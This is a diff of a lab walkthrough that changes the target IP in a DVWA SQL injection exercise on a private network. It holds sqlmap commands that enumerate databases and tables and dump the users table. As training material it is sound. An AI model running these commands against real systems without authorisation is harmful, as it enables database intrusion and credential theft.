@@ -19,7 +19,7 @@ April 27, 2026
 ## Target URL
 
 ```text
-http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit
+http://192.168.1.17/vulnerabilities/sqli/?id=1&Submit=Submit
 Cookie: security=low
 ```
 
@@ -28,21 +28,21 @@ Cookie: security=low
 ### 1. List All Databases
 
 ```bash
-sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.1.17/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="security=low" --dbs
 ```
 
 ### 2. List Tables in `dvwa`
 
 ```bash
-sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.1.17/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="security=low" -D dvwa --tables
 ```
 
 ### 3. Dump `users` Table
 
 ```bash
-sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.1.17/vulnerabilities/sqli/?id=1&Submit=Submit" \
 --cookie="security=low" -D dvwa -T users --dump
 ```
 
